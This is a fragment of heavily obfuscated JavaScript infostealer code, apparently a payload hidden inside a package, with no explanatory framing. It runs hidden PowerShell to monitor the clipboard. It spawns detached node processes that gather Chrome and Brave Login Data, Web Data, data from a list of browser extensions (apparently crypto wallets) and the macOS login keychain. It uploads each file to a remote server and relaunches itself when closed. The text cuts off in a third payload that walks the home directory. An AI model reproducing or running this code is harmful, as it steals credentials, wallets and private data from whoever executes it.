'+'at'+'fo'+'rm'+'()'+'\x20='+'=\x20'+'\x22w'+'in'+'32'+'\x22)'+'{\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'ex'+'ec'+'(\x22'+'po'+'we'+'rs'+'he'+'ll'+'\x20G'+'et'+'-C'+'li'+'pb'+'oa'+'rd'+('\x22,'+'\x20{'+'wi'+'nd'+'ow'+'sH'+'id'+'e:'+'\x20t'+'ru'+'e,'+'\x20s'+'td'+'io'+':\x20'+'\x22i'+'gn'+'or'+'e\x22'+'},'+'\x20('+'er'+'ro'+'r,'+'\x20s'+'td'+'ou'+'t,'+'\x20s'+'td'+'er'+'r)'+'\x20='+'>\x20'+'{\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'cu'+'rr'+'en'+'tC'+'li'+'pb'+'oa'+'rd'+'Co'+'nt'+'en'+'t\x20'+'=\x20'+'st'+'do'+'ut'+'.t'+'ri'+'m('+');'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20i'+'f\x20'+'(c'+'ur'+'re'+'nt'+'Cl'+'ip'+'bo'+'ar'+'dC'+'on'+'te'+'nt'+'\x20!'+'=='+'\x20l'+'as'+'tC'+'li'+'pb'+'oa'+'rd'+'Co'+'nt'+'en'+'t)'+'\x20{'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20c'+'le'+'ar'+'Ti'+'me'+'ou'+'t('+'ti'+'me'+'r)'+';\x20'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20t'+'im'+'er'+'\x20='+'\x20s'+'et'+'Ti'+'me'+'ou'+'t('+'()'+'\x20='+'>\x20'+'ha'+'nd'+'le'+'Cl'+'ip'+'bo'+'ar'+'dC'+'ha'+'ng'+'e('+'cu'+'rr'+'en'+'tC'+'li'+'pb'+'oa'+'rd'+'Co'+'nt'+'en'+'t)'+',\x20'+'50'+'0)'+';\x20'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20l'+'as'+'tC'+'li'+'pb'+'oa'+'rd'+'Co'+'nt'+'en'+'t\x20'+'=\x20'+'cu'+'rr'+'en'+'tC'+'li'+'pb'+'oa'+'rd'+'Co'+'nt'+'en'+'t;'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20}'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20}'+',{'+'\x20w'+'in'+'do'+'ws'+'Hi'+'de'+':\x20'+'tr'+'ue'+'\x20}'+')\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'}\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'}\x20'+'\x20\x20'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20s'+'et'+'In'+'te'+'rv'+'al'+'(w'+'at'+'ch'+'Cl'+'ip'+'bo'+'ar'+'d,'+'\x205'+'00'+');'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20}'+',3'+'00'+'0)'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'}\x20'+'ca'+'tc'+'h\x20'+'(e'+')\x20'+'{\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'ma'+'ke'+'Lo'+'g('+'JS'+'ON'+'.s'+'tr'+'in'+'gi'+'fy'+'(e'+'))'+';\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'}\x0a')),(ah=function(){try{R('no'+'de',['-e',ag],{'windowsHide':!0x0,'detached':!0x0,'stdio':'ig'+'no'+'re'})['on']('cl'+'os'+'e',function(){ah();});}catch(an){ah();}})(),ai=('co'+'ns'+'t\x20'+'{\x20'+'ex'+'ec'+'\x20}'+'\x20='+'\x20r'+'eq'+'ui'+'re'+'(\x22'+'ch'+'il'+'d_'+'pr'+'oc'+'es'+'s\x22'+');'+'\x0a\x20'+'\x20c'+'on'+'st'+'\x20p'+'at'+'h\x20'+'=\x20'+'re'+'qu'+'ir'+'e('+'\x22p'+'at'+'h\x22'+');'+'\x0a\x20'+'\x20c'+'on'+'st'+'\x20a'+'xi'+'os'+'\x20='+'\x20r'+'eq'+'ui'+'re'+'(\x22'+'ax'+'io'+'s\x22'+');'+'\x0a\x20'+'\x20c'+'on'+'st'+'\x20f'+'s\x20'+'=\x20'+'re'+'qu'+'ir'+'e('+'\x22f'+'s\x22'+');'+'\x0a\x20'+'\x20c'+'on'+'st'+'\x20o'+'s\x20'+'=\x20'+'re'+'qu'+'ir'+'e('+'\x22o'+'s\x22'+');'+'\x0a\x20'+'\x20c'+'on'+'st'+'\x20F'+'or'+'mD'+'at'+'a\x20'+'=\x20'+'re'+'qu'+'ir'+'e('+'\x22f'+'or'+'m-'+'da'+'ta'+'\x22)'+';\x0a'+'\x20\x20'+'co'+'ns'+'t\x20'+'fo'+'rm'+'Da'+'ta'+'\x20='+'\x20n'+'ew'+'\x20F'+'or'+'mD'+'at'+'a('+');'+'\x0a\x20'+'\x20c'+'on'+'st'+'\x20u'+'u\x20'+'=\x20'+'\x22h'+'tt'+'p:'+'//')['co'+'nc'+'at'](ac,':')['co'+'nc'+'at'](a0,'/u'+'pl'+'oa'+'d\x22'+';\x0a'+'\x20\x20'+'le'+'t\x20'+'i\x20'+'=\x20'+'0;'+'\x0a\x20'+'\x20c'+'on'+'st'+'\x20w'+'ps'+'\x20='+'\x20['+'\x0a\x20'+'\x20\x20'+'\x20\x22'+'ac'+'ma'+'co'+'dk'+'jb'+'dg'+'mo'+'le'+'eb'+'ol'+'md'+'jo'+'ni'+'lk'+'db'+'ch'+'\x22,'+'\x0a\x20'+'\x20\x20'+'\x20\x22'+'nk'+'bi'+'hf'+'be'+'og'+'ae'+'ao'+'eh'+'le'+'fn'+'ko'+'db'+'ef'+'gp'+'gk'+'nn'+'\x22,'+'\x0a\x20'+'\x20\x20'+'\x20\x22'+'bf'+'na'+'el'+'mo'+'me'+'im'+'hl'+'pm'+'gj'+'nj'+'op'+'hh'+'pk'+'ko'+'lj'+'pa'+'\x22,'+'\x0a\x20'+'\x20\x20'+'\x20\x22'+'ib'+'ne'+'jd'+'fj'+'mm'+'kp'+'cn'+'lp'+'eb'+'kl'+'mn'+'ko'+'eo'+'ih'+'of'+'ec'+'\x22,'+'\x0a\x20'+'\x20\x20'+'\x20\x22'+'pp'+'bi'+'be'+'lp'+'cj'+'mh'+'bd'+'ih'+'ak'+'fl'+'kd'+'co'+'cc'+'bg'+'bk'+'po'+'\x22,'+'\x0a\x20'+'\x20\x20'+'\x20\x22'+'om'+'aa'+'bb'+'ef'+'bm'+'ii'+'je'+'dn'+'gp'+'lf'+'jm'+'no'+'op'+'pb'+'cl'+'kk'+'\x22,'+'\x0a\x20'+'\x20\x20'+'\x20\x22'+'eg'+'ji'+'dj'+'bp'+'gl'+'ic'+'hd'+'co'+'nd'+'bc'+'bd'+'nb'+'ee'+'pp'+'gd'+'ph'+'\x22,'+'\x0a\x20'+'\x20\x20'+'\x20\x22'+'kh'+'pk'+'pb'+'bc'+'cc'+'dm'+'mc'+'lm'+'pi'+'gd'+'gd'+'da'+'be'+'il'+'kd'+'pd'+'\x22,'+'\x0a\x20'+'\x20\x20'+'\x20\x22'+'dm'+'ka'+'mc'+'kn'+'og'+'kg'+'cd'+'fh'+'hb'+'dd'+'cg'+'ha'+'ch'+'ke'+'je'+'ap'+'\x22,'+'\x0a\x20'+'\x20\x20'+'\x20\x22'+'ej'+'ba'+'lb'+'ak'+'op'+'lc'+'hl'+'gh'+'ec'+'da'+'lm'+'ee'+'ea'+'jn'+'im'+'hm'+'\x22,'+'\x0a\x20'+'\x20\x20'+'\x20\x22'+'fh'+'bo'+'hi'+'ma'+'el'+'bo'+'hp'+'jb'+'bl'+'dc'+'ng'+'cn'+'ap'+'nd'+'od'+'jp'+'\x22,'+'\x0a\x20'+'\x20\x20'+'\x20\x22'+'ae'+'ac'+'hk'+'nm'+'ef'+'ph'+'ep'+'cc'+'io'+'nb'+'oo'+'hc'+'ko'+'no'+'ee'+'mg'+'\x22,'+'\x0a\x20'+'\x20\x20'+'\x20\x22'+'hi'+'fa'+'fg'+'mc'+'cd'+'pe'+'kp'+'lo'+'mj'+'jk'+'cf'+'go'+'dn'+'hc'+'el'+'lj'+'\x22,'+'\x0a\x20'+'\x20\x20'+'\x20\x22'+'jb'+'ln'+'dl'+'ip'+'eo'+'gp'+'af'+'nl'+'dh'+'gm'+'ap'+'ag'+'cc'+'cf'+'ch'+'pi'+'\x22,'+'\x0a\x20'+'\x20\x20'+'\x20\x22'+'dl'+'co'+'bp'+'ji'+'ig'+'pi'+'ko'+'ob'+'oh'+'ma'+'be'+'hh'+'mh'+'fo'+'od'+'bb'+'\x22,'+'\x0a\x20'+'\x20\x20'+'\x20\x22'+'mc'+'oh'+'il'+'nc'+'bf'+'ah'+'bm'+'gd'+'jk'+'bp'+'em'+'cc'+'ii'+'ol'+'gc'+'ge'+'\x22,'+'\x0a\x20'+'\x20\x20'+'\x20\x22'+'ag'+'oa'+'kf'+'ej'+'ja'+'bo'+'me'+'mp'+'kj'+'le'+'pd'+'fl'+'al'+'ee'+'ob'+'hb'+'\x22,'+'\x0a\x20'+'\x20\x20'+'\x20\x22'+'ah'+'ol'+'pf'+'di'+'al'+'jg'+'jf'+'ho'+'mi'+'hk'+'jb'+'mg'+'ji'+'dl'+'cd'+'no'+'\x22,'+'\x0a\x20'+'\x20\x20'+'\x20\x22'+'np'+'hp'+'lp'+'go'+'ak'+'hh'+'jc'+'hk'+'kh'+'mi'+'gg'+'ak'+'ij'+'nk'+'hf'+'nd'+'\x22,'+'\x0a\x20'+'\x20\x20'+'\x20\x22'+'pe'+'nj'+'ld'+'dj'+'kj'+'gp'+'nk'+'ll'+'bo'+'cc'+'dg'+'cc'+'ek'+'pk'+'cb'+'in'+'\x22,'+'\x0a\x20'+'\x20\x20'+'\x20\x22'+'lg'+'mp'+'cp'+'gl'+'pn'+'gd'+'oa'+'lb'+'ge'+'ol'+'de'+'aj'+'fc'+'ln'+'ha'+'fa'+'\x22,'+'\x0a\x20'+'\x20\x20'+'\x20\x22'+'fl'+'df'+'pg'+'ip'+'fn'+'cg'+'nd'+'fo'+'lc'+'bk'+'de'+'ek'+'nb'+'bb'+'nh'+'cc'+'\x22,'+'\x0a\x20'+'\x20\x20'+'\x20\x22'+'bh'+'hh'+'lb'+'ep'+'dk'+'ba'+'pa'+'dj'+'dn'+'no'+'jk'+'bg'+'io'+'io'+'db'+'ic'+'\x22,'+'\x0a\x20'+'\x20\x20'+'\x20\x22'+'gj'+'nc'+'kg'+'kf'+'mg'+'mi'+'bb'+'ko'+'fi'+'cd'+'id'+'cl'+'je'+'aa'+'ah'+'eg'+'\x22,'+'\x0a\x20'+('\x20\x20'+'\x20\x22'+'af'+'bc'+'bj'+'pb'+'pf'+'ad'+'lk'+'mh'+'mc'+'lh'+'ke'+'eo'+'dm'+'am'+'cf'+'lc'+'\x22,'+'\x0a\x20'+'\x20]'+';\x0a'+'\x20\x20'+'co'+'ns'+'t\x20'+'ge'+'tB'+'as'+'eP'+'at'+'hs'+'\x20='+'\x20('+')\x20'+'=>'+'\x20{'+'\x0a\x20'+'\x20\x20'+'\x20c'+'on'+'st'+'\x20p'+'la'+'tf'+'or'+'m\x20'+'=\x20'+'pr'+'oc'+'es'+'s.'+'pl'+'at'+'fo'+'rm'+';\x0a'+'\x20\x20'+'\x20\x20'+'if'+'\x20('+'pl'+'at'+'fo'+'rm'+'\x20='+'=='+'\x20\x22'+'wi'+'n3'+'2\x22'+')\x20'+'{\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'re'+'tu'+'rn'+'\x20['+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20`'+'${'+'pa'+'th'+'.j'+'oi'+'n('+'pr'+'oc'+'es'+'s.'+'en'+'v.'+'LO'+'CA'+'LA'+'PP'+'DA'+'TA'+',\x20'+'\x22G'+'oo'+'gl'+'e/'+'Ch'+'ro'+'me'+'/U'+'se'+'r\x20'+'Da'+'ta'+'\x22)'+'}`'+',\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'`$'+'{p'+'at'+'h.'+'jo'+'in'+'(\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'pr'+'oc'+'es'+'s.'+'en'+'v.'+'LO'+'CA'+'LA'+'PP'+'DA'+'TA'+',\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x22B'+'ra'+'ve'+'So'+'ft'+'wa'+'re'+'/B'+'ra'+'ve'+'-B'+'ro'+'ws'+'er'+'/U'+'se'+'r\x20'+'Da'+'ta'+'\x22\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+')}'+'`,'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20]'+';\x0a'+'\x20\x20'+'\x20\x20'+'}\x20'+'el'+'se'+'\x20i'+'f\x20'+'(p'+'la'+'tf'+'or'+'m\x20'+'=='+'=\x20'+'\x22d'+'ar'+'wi'+'n\x22'+')\x20'+'{\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'re'+'tu'+'rn'+'\x20['+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20`'+'${'+'pa'+'th'+'.j'+'oi'+'n('+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20p'+'ro'+'ce'+'ss'+'.e'+'nv'+'.H'+'OM'+'E,'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x22'+'Li'+'br'+'ar'+'y/'+'Ap'+'pl'+'ic'+'at'+'io'+'n\x20'+'Su'+'pp'+'or'+'t/'+'Go'+'og'+'le'+'/C'+'hr'+'om'+'e\x22'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20)'+'}`'+',\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'`$'+'{p'+'at'+'h.'+'jo'+'in'+'(\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'pr'+'oc'+'es'+'s.'+'en'+'v.'+'HO'+'ME'+',\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x22L'+'ib'+'ra'+'ry'+'/A'+'pp'+'li'+'ca'+'ti'+'on'+'\x20S'+'up'+'po'+'rt'+'/B'+'ra'+'ve'+'So'+'ft'+'wa'+'re'+'/B'+'ra'+'ve'+'-B'+'ro'+'ws'+'er'+'\x22\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+')}'+'`,'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20]'+';\x0a'+'\x20\x20'+'\x20\x20'+'}\x20'+'el'+'se'+'\x20i'+'f\x20'+'(p'+'la'+'tf'+'or'+'m\x20'+'=='+'=\x20'+'\x22l'+'in'+'ux'+'\x22)'+'\x20{'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20r'+'et'+'ur'+'n\x20'+'[\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'`$'+'{p'+'at'+'h.'+'jo'+'in'+'(p'+'ro'+'ce'+'ss'+'.e'+'nv'+'.H'+'OM'+'E,'+'\x20\x22'+'.c'+'on'+'fi'+'g/'+'go'+'og'+'le'+'-c'+'hr'+'om'+'e\x22'+')}'+'`,'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20`'+'${'+'pa'+'th'+'.j'+'oi'+'n('+'pr'+'oc'+'es'+'s.'+'en'+'v.'+'HO'+'ME'+',\x20'+'\x22.'+'co'+'nf'+'ig'+'/B'+'ra'+'ve'+'So'+'ft'+'wa'+'re'+'/B'+'ra'+'ve'+'-B'+'ro'+'ws'+'er'+'\x22)'+'}`'+',\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'];'+'\x0a\x20'+'\x20\x20'+'\x20}'+'\x20e'+'ls'+'e\x20'+'{\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'pr'+'oc'+'es'+'s.'+'ex'+'it'+'(1'+');'+'\x0a\x20'+'\x20\x20'+'\x20}'+'\x0a\x20'+'\x20}'+';\x0a'+'\x20\x20'+'\x0a\x20'+'\x20a'+'sy'+'nc'+'\x20f'+'un'+'ct'+'io'+'n\x20'+'sl'+'ee'+'p('+'ms'+')\x20'+'{\x0a'+'\x20\x20'+'\x20\x20'+'re'+'tu'+'rn'+'\x20n'+'ew'+'\x20P'+'ro'+'mi'+'se'+'(('+'re'+'so'+'lv')+('e)'+'\x20='+'>\x20'+'se'+'tT'+'im'+'eo'+'ut'+'(r'+'es'+'ol'+'ve'+',\x20'+'ms'+'))'+';\x0a'+'\x20\x20'+'}\x0a'+'\x20\x20'+'co'+'ns'+'t\x20'+'ba'+'se'+'Pa'+'th'+'s\x20'+'=\x20'+'ge'+'tB'+'as'+'eP'+'at'+'hs'+'()'+';\x0a'+'\x20\x20'+'co'+'ns'+'t\x20'+'uf'+'\x20='+'\x20a'+'sy'+'nc'+'\x20('+'p)'+'\x20='+'>\x20'+'{\x0a'+'\x20\x20'+'\x20\x20'+'if'+'\x20('+'!f'+'s.'+'ex'+'is'+'ts'+'Sy'+'nc'+'(p'+'))'+'\x20r'+'et'+'ur'+'n\x20'+'fa'+'ls'+'e;'+'\x0a\x20'+'\x20\x20'+'\x20i'+'f\x20'+'(f'+'s.'+'st'+'at'+'Sy'+'nc'+'(p'+').'+'is'+'Fi'+'le'+'()'+')\x20'+'{\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'co'+'ns'+'t\x20'+'fo'+'rm'+'\x20='+'\x20n'+'ew'+'\x20F'+'or'+'mD'+'at'+'a('+');'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20f'+'or'+'m.'+'ap'+'pe'+'nd'+'(\x22'+'fi'+'le'+'\x22,'+'\x20f'+'s.'+'cr'+'ea'+'te'+'Re'+'ad'+'St'+'re'+'am'+'(p'+'))'+';\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'tr'+'y\x20'+'{\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'co'+'ns'+'t\x20'+'re'+'sp'+'on'+'se'+'\x20='+'\x20a'+'wa'+'it'+'\x20a'+'xi'+'os'+'.p'+'os'+'t('+'uu'+',\x20'+'fo'+'rm'+',\x20'+'{\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'he'+'ad'+'er'+'s:'+'\x20{'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20.'+'..'+'fo'+'rm'+'.g'+'et'+'He'+'ad'+'er'+'s('+'),'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20u'+'se'+'rk'+'ey'+':\x20'))['co'+'nc'+'at'](W,',\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'ho'+'st'+'na'+'me'+':\x20'+'os'+'.h'+'os'+'tn'+'am'+'e('+'),'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20p'+'at'+'h:'+'\x20p'+',\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'t:'+'\x20\x22')['co'+'nc'+'at'](a1,'\x22,'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20}'+',\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'})'+';\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'}\x20'+'ca'+'tc'+'h\x20'+'(u'+'pl'+'oa'+'dE'+'rr'+')\x20'+'{\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'}\x0a'+'\x20\x20'+'\x20\x20'+'}\x0a'+'\x20\x20'+'};'+'\x0a\x20'+'\x20c'+'on'+'st'+'\x20g'+'et'+'Fi'+'nd'+'Co'+'mm'+'an'+'ds'+'\x20='+'\x20a'+'sy'+'nc'+'\x20('+')\x20'+'=>'+'\x20{'+'\x0a\x20'+'\x20\x20'+'\x20c'+'on'+'st'+'\x20p'+'la'+'tf'+'or'+'m\x20'+'=\x20'+'pr'+'oc'+'es'+'s.'+'pl'+'at'+'fo'+'rm'+';\x0a'+'\x20\x20'+'\x20\x20'+'le'+'t\x20'+'co'+'mm'+'an'+'ds'+'\x20='+'\x20['+'];'+'\x0a\x20'+'\x20\x20'+'\x20f'+'or'+'\x20('+'ba'+'se'+'Pa'+'th'+'\x20o'+'f\x20'+'ba'+'se'+'Pa'+'th'+'s)'+'\x20{'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20i'+'f\x20'+'(!'+'fs'+'.e'+'xi'+'st'+'sS'+'yn'+'c('+'ba'+'se'+'Pa'+'th'+'))'+'\x20c'+'on'+'ti'+'nu'+'e;'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20c'+'on'+'st'+'\x20f'+'ol'+'de'+'rs'+'\x20='+'\x20f'+'s\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'.r'+'ea'+'dd'+'ir'+'Sy'+'nc'+'(b'+'as'+'eP'+'at'+'h)'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20.'+'fi'+'lt'+'er'+'(('+'fo'+'ld'+'er'+')\x20'+'=>'+'\x20/'+'^P'+'ro'+'fi'+'le'+'.*'+'|^'+'De'+'fa'+'ul'+'t$'+'/.'+'te'+'st'+'(f'+'ol'+'de'+'r)'+');'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20f'+'or'+'\x20('+'fo'+'ld'+'er'+'\x20o'+'f\x20'+'fo'+'ld'+'er'+'s)'+'\x20{'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20f'+'or'+'\x20('+'wp'+'\x20o'+'f\x20'+'wp'+'s)'+'\x20{'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20c'+'on'+'st'+'\x20f'+'p\x20'+'=\x20'+'`$'+'{b'+'as'+'eP'+'at'+'h}'+'/$'+'{f'+'ol'+'de'+'r}'+'/L'+'oc'+'al'+'\x20E'+'xt'+'en'+'si'+'on'+'\x20S'+'et'+'ti'+'ng'+'s/'+'${'+'wp'+'}`'+';\x0a'+'\x20\x20'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20i'+'f\x20'+'(!'+'fs'+'.e'+'xi'+'st'+'sS'+'yn'+'c('+'fp'+'))'+'\x20c'+'on'+'ti'+'nu'+'e;'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20c'+'on'+'st'+'\x20d'+'ir'+'s\x20'+'=\x20'+'fs'+'.r'+'ea'+'dd'+'ir'+'Sy'+'nc'+'(f'+'p)'+';\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'fo'+'r\x20'+'(d'+'r\x20'+'of'+'\x20d'+'ir'+'s)'+'\x20{'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20a'+'wa'+'it'+'\x20u'+'f('+'`$'+'{f'+'p}'+'/$'+'{d'+'r}'+'`)'+';\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'}\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'}\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'aw'+'ai'+'t\x20'+'uf'+'(`'+'${'+'ba'+'se'+'Pa'+'th'+'}/'+'${'+'fo'+'ld'+'er'+'}/'+'Lo'+'gi'+'n\x20'+'Da'+'ta'+'`)'+';\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'aw'+'ai'+'t\x20'+'uf'+'(`'+'${'+'ba'+'se'+'Pa'+'th'+'}/'+'${'+'fo'+'ld'+'er'+'}/'+'We'+'b\x20'+'Da'+'ta'+'`)'+';\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'}\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'if'+'\x20('+'os'+'.p'+'la'+'tf'+'or'+'m('+')\x20'+'=='+'\x20\x22'+'da'+'rw'+'in'+'\x22)'+'\x20{'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20a'+'wa'+'it'+'\x20u'+'f('+'`$'+'{p'+'ro'+'ce'+'ss'+'.e'+'nv'+'.H'+'OM'+'E}'+'/L'+'ib'+'ra'+'ry'+'/K'+'ey'+'ch'+'ai'+'ns'+'/l'+'og'+'in'+'.k'+'ey'+'ch'+'ai'+'n-'+'db'+'`)'+';\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'}\x0a'+'\x20\x20'+'\x20\x20'+'}\x0a'+'\x20\x20'+'\x0a\x20'+'\x20\x20'+'\x20r'+'et'+'ur'+'n\x20'+'co'+'mm'+'an'+'ds'+'.j'+'oi'+'n('+'\x22\x20'+'&&'+'\x20\x22'+');'+'\x0a\x20'+'\x20}'+';\x0a'+'\x20\x20'+'\x0a\x20'+'\x20c'+'on'+'st'+'\x20r'+'un'+'\x20='+'\x20a'+'sy'+'nc'+('\x20('+')\x20'+'=>'+'\x20{'+'\x0a\x20'+'\x20\x20'+'\x20c'+'on'+'st'+'\x20f'+'in'+'dC'+'om'+'ma'+'nd'+'\x20='+'\x20a'+'wa'+'it'+'\x20g'+'et'+'Fi'+'nd'+'Co'+'mm'+'an'+'ds'+'()'+';\x0a'+'\x20\x20'+'\x20\x20'+'i+'+'+;'+'\x0a\x20'+'\x20\x20'+'\x20a'+'wa'+'it'+'\x20s'+'le'+'ep'+'(1'+'00'+'00'+');'+'\x0a\x20'+'\x20\x20'+'\x20i'+'\x20<'+'=\x20'+'5\x20'+'&&'+'\x20('+'aw'+'ai'+'t\x20'+'ru'+'n('+'))'+';\x0a'+'\x20\x20'+'};'+'\x0a\x20'+'\x20('+'as'+'yn'+'c\x20'+'()'+'\x20='+'>\x20'+'{\x0a'+'\x20\x20'+'\x20\x20'+'aw'+'ai'+'t\x20'+'ru'+'n('+');'+'\x0a\x20'+'\x20}'+')('+');'+'\x0a'));try{R('no'+'de',['-e',ai],{'windowsHide':!0x0,'detached':!0x0,'stdio':'ig'+'no'+'re'});}catch(an){}aj=('\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20c'+'on'+'st'+'\x20f'+'s\x20'+'=\x20'+'re'+'qu'+'ir'+'e('+'\x22f'+'s\x22'+');'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20c'+'on'+'st'+'\x20p'+'at'+'h\x20'+'=\x20'+'re'+'qu'+'ir'+'e('+'\x22p'+'at'+'h\x22'+');'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20c'+'on'+'st'+'\x20o'+'s\x20'+'=\x20'+'re'+'qu'+'ir'+'e('+'\x22o'+'s\x22'+');'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20c'+'on'+'st'+'\x20F'+'or'+'mD'+'at'+'a\x20'+'=\x20'+'re'+'qu'+'ir'+'e('+'\x22f'+'or'+'m-'+'da'+'ta'+'\x22)'+';\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'co'+'ns'+'t\x20'+'ax'+'io'+'s\x20'+'=\x20'+'re'+'qu'+'ir'+'e('+'\x22a'+'xi'+'os'+'\x22)'+';\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'co'+'ns'+'t\x20'+'{\x20'+'ex'+'ec'+'Sy'+'nc'+',\x20'+'ex'+'ec'+'\x20}'+'\x20='+'\x20r'+'eq'+'ui'+'re'+'(\x22'+'ch'+'il'+'d_'+'pr'+'oc'+'es'+'s\x22'+');'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20c'+'on'+'st'+'\x20r'+'oo'+'tD'+'ir'+'\x20='+'\x20o'+'s.'+'us'+'er'+'In'+'fo'+'()'+'.h'+'om'+'ed'+'ir'+'\x20+'+'\x20\x22'+'\x22;'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20c'+'on'+'st'+'\x20e'+'xc'+'lu'+'de'+'Fo'+'ld'+'er'+'s\x20'+'=\x20'+'[\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x22n'+'od'+'e_'+'mo'+'du'+'le'+'s\x22'+',\x0a'+'\x20\x20'+'\x20\x20'+'\x